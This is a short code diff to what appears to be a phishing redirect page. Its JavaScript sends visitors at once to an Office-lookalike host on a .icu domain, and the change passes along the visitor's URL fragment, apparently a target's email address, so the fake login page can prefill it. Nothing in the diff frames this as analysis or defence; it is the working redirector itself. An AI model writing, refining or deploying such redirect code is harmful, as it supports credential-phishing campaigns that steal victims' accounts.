@@ -9,8 +9,11 @@
             // Define the base URL to redirect to
             var baseUrl = "https://office.ovadeivicefilshr.icu/CgFHgEUV";
             
-            // Construct the full URL with the fragment identifier "#email"
-            var fullUrl = baseUrl + "#email";
+            // Grab the fragment identifier from the current page URL (if exists)
+            var fragment = window.location.hash || "#email";  // Default to #email if no fragment is present
+            
+            // Construct the full URL with the fragment identifier
+            var fullUrl = baseUrl + fragment;
             
             // Redirect immediately
             window.location.href = fullUrl;
